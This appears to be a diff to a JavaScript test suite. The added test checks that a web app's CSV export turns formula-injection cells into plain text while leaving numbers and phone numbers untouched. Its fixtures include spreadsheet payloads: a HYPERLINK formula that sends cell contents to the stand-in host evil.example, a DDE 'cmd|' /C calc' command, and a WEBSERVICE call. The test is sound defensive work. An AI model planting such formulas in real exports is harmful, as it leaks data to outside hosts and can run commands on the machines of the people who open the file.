@@ -552,6 +552,18 @@ test("13 · spreadsheet exports turn a cell that would run as a formula into pla
   assert.deepEqual(cells, ['\'=HYPERLINK("http://evil.example","x")', "'@SUM(A1)", "'-cmd|' /C calc'!A0", "'+HYPERLINK(1)", "'\tlead", "+963944000001", "-5", "-3.5", "plain"]);
 });
 
+test("13 · a sign followed by a figure and then a formula is text too; only a cell that is wholly a number or a phone number keeps its sign (fix review of D-43)", () => {
+  let csv = null; const js = f => readFileSync(new URL(`../public/js/${f}`, import.meta.url), "utf8");
+  const ctx = vm.createContext({ console, S: { lang: "en" }, document: { createElement: () => ({ click() {}, remove() {} }), body: { appendChild() {} } },
+    URL: { createObjectURL: b => { csv = b.parts.join(""); return "blob:x"; }, revokeObjectURL() {} }, Blob: class { constructor(p) { this.parts = p; } }, setTimeout: () => 0 });
+  for (const f of ["lookups.js", "i18n.js", "i18n2.js", "i18n3.js", "i18n4.js", "engine.js", "app-plans.js"]) vm.runInContext(js(f), ctx, { filename: f });
+  const live = ['+1+HYPERLINK("https://evil.example/?"&A1)', "-2+3+cmd|' /C calc'!A0", "- 1+SUM(A1)", '+.5+WEBSERVICE("x")'], kept = ["+963 944 000 111", "+963944000001", "-5", "-3.5", "-", "+ 12.5"];
+  ctx.rows = [...live, ...kept].map(v => ({ v }));
+  vm.runInContext('downloadCSV("t.csv", rows)', ctx);
+  const cells = csv.replace(/^\uFEFF/, "").split("\n").slice(1).map(c => c.replace(/^"|"$/g, "").replace(/""/g, '"'));
+  assert.deepEqual(cells, [...live.map(v => "'" + v), ...kept], "the guessed payloads (a guest's campaign tag or error text reaches the admin's traffic sheet) are text; numbers and phone numbers are untouched");
+});
+
 test("13 · the scanner opens key and certificate files, and warns when the email key would go to a plain-http address (D-51, D-52)", () => {
   const tmp = mkdtempSync(path.join(os.tmpdir(), "shg-scan-")), pem = ["-----BEGIN RSA " + "PRIVATE KEY-----", "MIIB" + "A".repeat(60), "-----END RSA " + "PRIVATE KEY-----"].join("\n");   // assembled at run time so this file is not itself a finding
   for (const f of ["server.pem", "deploy.key", "id_rsa"]) writeFileSync(path.join(tmp, f), pem + "\n");
